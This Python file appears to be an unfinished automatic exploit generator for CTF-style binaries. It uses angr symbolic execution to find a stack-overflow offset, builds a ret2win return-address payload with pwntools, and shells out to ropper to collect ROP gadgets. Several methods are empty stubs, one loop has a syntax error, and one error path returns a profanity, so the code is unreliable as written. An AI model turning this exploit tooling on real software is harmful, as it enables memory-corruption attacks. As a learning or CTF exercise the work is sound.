from pwn import *
import angr, claripy
import subprocess

class ROP:
    def __init__(self, filename, properties):
        self.filename = filename
        self.properties = properties
        self.offset = Get2overflow(filename).buf()
        self.e = ELF(filename)
        self.gadgets = []

    def ret2win(self):
        payload = cyclic(self.offset)
        payload += p64(self.e.sym["win"])
        return payload

    def ret2execve(self):
        payload = cyclic(self.offset)
        

    def ret2syscall(self):
        pass

    def supporting_functions_here(self): # ---------------------------------------------
        print("example support function")

    def find_gadgets(self):
        cmd = "ropper --nocolor -f " + self.filename + " 2>/dev/null | getp 0x"
        raw_gadgets = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for i in sorted(raw_gadgets.communicate()[0].decode("utf-8").split("\n"), key=len):
            self.gadgets.append(i.replace(" nop;", ""))

    def get_gadgets(self):
        return self.gadgets

    def get_pops(self):
        pops = []
        for i in self.gadgets

    def num_pops(self, string):
        return string.count('pop')
    
    def pop_reg(self, reg):
        for i in self.get_pops():
            if ': pop ' + reg + "; ret;" in i:
                return [i.split(":")[0], 1] # return address
            elif "pop " + reg in i:
                return [i.split(":")[0], self.num_pops(i)]

class Get2overflow:
    def __init__(s, binary):
        s.elf = context.binary =  ELF(binary)
        s.proj = angr.Project(binary)
        start_addr = s.elf.sym["main"]
        # Maybe change to symbolic file stream
        buff_size = 1024
        s.symbolic_input = claripy.BVS("input", 8 * buff_size)
        s.symbolic_padding = None

        s.state = s.proj.factory.blank_state(
                addr=start_addr,
                stdin=s.symbolic_input
        )
        s.simgr = s.proj.factory.simgr(s.state, save_unconstrained=True)
        s.simgr.stashes["mem_corrupt"] = []

        s.simgr.explore(step_func=s.check_mem_corruption)

    def check_mem_corruption(s, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    stack_smash = path.solver.eval(s.symbolic_input, cast_to=bytes)
                    try:
                        index = stack_smash.index(b"AAAAAAAA")
                        s.symbolic_padding = stack_smash[:index]
                        simgr.stashes["mem_corrupt"].append(path)
                    except:
                        print("do a thing")
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")

        return simgr

    def buf(s):
        try:
            return len(s.symbolic_padding)
        except:
            return "Fuck"
